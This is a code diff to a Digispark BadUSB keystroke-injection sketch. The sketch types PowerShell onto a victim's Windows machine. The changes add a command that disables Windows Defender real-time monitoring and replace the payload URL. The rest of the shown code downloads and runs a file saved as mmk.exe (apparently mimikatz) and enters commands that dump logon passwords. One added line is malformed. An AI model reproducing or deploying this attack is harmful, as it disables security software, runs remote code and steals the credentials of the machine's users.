@@ -14,10 +14,12 @@ void loop() {
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
-  
+
+  DigiKeyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
+  DigiKeyboard.delay(300);
   DigiKeyboard.println("$down = New-Object System.Net.WebClient;");
   DigiKeyboard.delay(300);
-  DigiKeyboard.println("$url = 'http://download1478.mediafire.com/3yz2saahmzng/ta6dshd1l1van8k/mimikatz.jpg';");
+  DigiKeyboard.println("$url = 'https://1fichier.com/?exxhq7yyu3';");
   DigiKeyboard.delay(250);
   DigiKeyboard.println("$file = 'mmk.exe'; $down.DownloadFile($url,$file);");
   DigiKeyboard.delay(15000);
@@ -26,7 +28,7 @@ void loop() {
   DigiKeyboard.println("$exec.shellexecute($file); exit;");
   DigiKeyboard.delay(500);
   DigiKeyboard.println("MOD_GUI_LEFT,MOD_ALT_LEFT");
-  DigiKeyboard.delay(2000);
+  DigiKeyboard.delay(2000);Set-MpPref
   DigiKeyboard.println("privilege::debug");
   DigiKeyboard.delay(300);
   DigiKeyboard.println("sekurlsa::logonPasswords full");
